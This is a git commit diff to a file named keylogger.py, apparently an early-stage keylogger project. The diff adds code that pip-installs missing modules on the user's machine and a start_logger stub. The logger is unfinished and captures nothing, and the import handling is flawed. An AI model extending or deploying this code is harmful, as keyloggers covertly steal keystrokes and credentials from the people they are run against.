e00963c78c984a5951cf1011b422c039fd552989
Ross Greenall <rossgreenall@gmail.com>
2023-08-24 03:47:52 +0100

    Writing code to install missing packages before executing Listeners and returning data

--- keylogger.py
+++ keylogger.py
@@ -1,6 +1,11 @@
 #!/usr/bin/python3
 try: #Try to load modules, if not found install on users machine?
     import keyboard
+    import subprocess
+    import sys
+except:
+    def install(packages):
+        subprocess.check_call([sys.executable, "-m", "pip", "install", packages])
 finally:
     def start_logger():
         return 0
